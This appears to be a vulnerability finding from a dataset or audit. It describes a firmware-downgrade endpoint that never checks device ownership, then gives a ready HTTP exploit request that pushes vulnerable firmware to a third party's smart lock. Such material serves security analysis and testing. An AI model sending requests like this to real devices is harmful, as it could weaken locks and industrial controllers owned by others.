diagnosis: The Kafka message consumer accepts deviceHardwareId and targetVersion from the message stream and publishes an over-the-air firmware downgrade payload over MQTT. It does not verify whether initiatedByUserId is the registered owner of the IoT device. An attacker can force vulnerable legacy firmware onto smart locks or industrial controllers owned by third parties.
exploit_request:
POST /api/iot/queue-firmware-task HTTP/1.1
Host: iot.smarthomehub.io
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"deviceHardwareId": "LOCK_SMART_00889", "targetVersion": "1.0.0-vulnerable"}
